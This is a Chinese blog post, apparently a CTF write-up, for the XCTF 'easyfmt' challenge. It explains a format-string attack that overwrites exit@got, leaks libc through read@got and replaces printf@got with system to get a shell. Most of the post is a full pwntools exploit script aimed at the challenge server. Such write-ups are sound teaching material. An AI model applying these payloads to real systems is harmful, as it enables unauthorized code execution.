@@ -1,0 +1,48 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>XCTF-easyfmt-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="easy是easy，但是特别麻烦。 简单的四步。 checkin没什么好办法，老老实实爆破，概率0.2，'0'-'4'都有可能 修改exit的go"><meta property="og:image" content><meta property="og:title" content="XCTF-easyfmt-WP"><meta property="og:description" content="easy是easy，但是特别麻烦。 简单的四步。 checkin没什么好办法，老老实实爆破，概率0.2，'0'-'4'都有可能 修改exit的go"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/xctf-easyfmt-wp.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-12-29T11:46:00+00:00"><meta property="article:modified_time" content="2020-12-29T11:46:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="XCTF-easyfmt-WP"><meta name=twitter:description content="easy是easy，但是特别麻烦。 简单的四步。 checkin没什么好办法，老老实实爆破，概率0.2，'0'-'4'都有可能 修改exit的go"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>XCTF-easyfmt-WP</h1><div class=meta>Posted on Dec 29, 2020</div></div><section class=body><p>easy是easy，但是特别麻烦。</p><p>简单的四步。</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/12/屏幕截图-2020-12-29-113841.png alt class=wp-image-870></figure></div><p>checkin没什么好办法，老老实实爆破，概率0.2，'0'-'4'都有可能</p><p>修改exit的got表值为</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/12/屏幕截图-2020-12-29-114022.png alt class=wp-image-871></figure></div><p>光标所指的这一行的地址，由于延迟绑定，原got表值为exit的plt表的偏移处，所以我们修改低二字节就可以了</p><p>leak出某个函数的got表值，用libcsearcher找出机器的libc版本</p><p>覆写printf@got为system的地址，输入'/bin/sh\x00'，getshell</p><pre class=wp-block-code><code>#!/usr/bin/env python                                                                                 
+# coding=utf-8                                                                                        
+from pwn import *                                                                                     
+from LibcSearcher import *                                                                            
+context(log_level = 'debug')                                                                          
+                                                                                                      
+elf = ELF("./easyfmt")                                                                                
+sh = remote('220.249.52.134','31322')                                                                 
+sh.sendlineafter("enter:",'0')                                                                        
+#payload = p64(elf.got["exit"]) + '%' + str(0x0982 - 8) + 'c' + '%8$hn'                               
+payload = '%' + str(0x0982) + 'c' + '%10$hn'                                                          
+payload = payload.ljust(16,'f')                                                                       
+payload += p64(elf.got['exit'])                                                                       
+sh.sendafter("slogan: ",payload)                                                                      
+                                                                                                      
+payload = 'start-%11$s-endf' #length 16                                                               
+payload += p64(elf.got['read'])                                                                       
+sh.sendafter("slogan: ",payload)                                                                      
+sh.recvuntil('start-')                                                                                
+#read_addr = int(sh.recvuntil('-end',drop = True),base = 16)                                          
+read_addr = u64(sh.recvuntil('-end',drop = True).ljust(8,'\x00'))                                     
+                                                                                                      
+payload = ''                                                                                          
+libc = LibcSearcher('read',read_addr)                                                                 
+system_addr = read_addr - libc.dump('read') + libc.dump('system')                                     
+print hex(system_addr)                                                                                
+if(((system_addr & 0x00000000ffff0000)>>16) > (system_addr & 0x000000000000ffff)):                    
+    payload  = '%' + str((system_addr & 0x000000000000ffff)) + 'c' + '%14$hn'                         
+    payload += '%' + str(((system_addr & 0x00000000ffff0000)>>16) - (system_addr & 0x000000000000ffff)) 
++ 'c' + '%15$hn'                                                                                      
+    payload = payload.ljust(32,'f')                                                                   
+    payload += p64(elf.got['printf']) + p64(elf.got['printf'] + 2)                                    
+else:                                                                                                 
+    payload  = '%' + str((system_addr & 0x00000000ffff0000)>>16) + 'c' + '%15$hn'                     
+    payload += '%' + str((system_addr & 0x000000000000ffff) - ((system_addr & 0x00000000ffff0000)>>16)) 
++ 'c' + '%14$hn'                                                                                      
+    payload = payload.ljust(32,'f')                                                                   
+    payload += p64(elf.got['printf']) + p64(elf.got['printf'] + 2)                                    
+sh.sendafter("slogan: ",payload)                                                                      
+sh.sendafter("slogan: ",'/bin/sh\x00')                                                                
+sh.interactive()                                                                                        </code></pre><p>要注意的是每一次重新printf格式化字符串的时候，都进行了一次call操作，所以rsp会每次增加8，所以参数要每次加一。</p><p>这道题目也算是复习一下格式化字符串（几天不做就不会了），对于没有开启full reload的题，其实基本上就是leak libc->覆写got->ret2libc，堆利用和格式化字符串就是这么个套路</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
